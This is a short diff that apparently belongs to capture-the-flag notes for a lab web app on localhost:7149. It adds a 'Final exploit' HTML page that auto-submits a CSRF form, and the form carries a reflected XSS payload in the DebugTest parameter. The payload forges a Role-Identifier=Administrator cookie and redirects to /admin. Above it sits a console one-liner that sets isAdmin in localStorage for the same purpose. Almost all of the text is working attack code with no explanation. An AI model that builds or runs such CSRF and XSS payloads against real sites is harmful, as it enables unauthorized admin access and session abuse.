@@ -144,4 +144,17 @@ location.href = '/admin';
 
 # One-liner
 localStorage.setItem('isAdmin','true'); document.cookie = "Role-Identifier=Administrator; path=/"; console.log('done'); location.href='/admin';
+
+# Final exploit
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Flag5</title></head>
+<body onload=document.forms[0].submit()>
+  <form id="f" method="POST" action="http://localhost:7149/admin/debug-test?DebugTest=<script>document.cookie='Role-Identifier=Administrator; path=/'; location.href='/admin';</script>">
+  </form>
+  <script>
+    document.getElementById("f").submit();
+  </script>
+</body>
+</html>
 ```
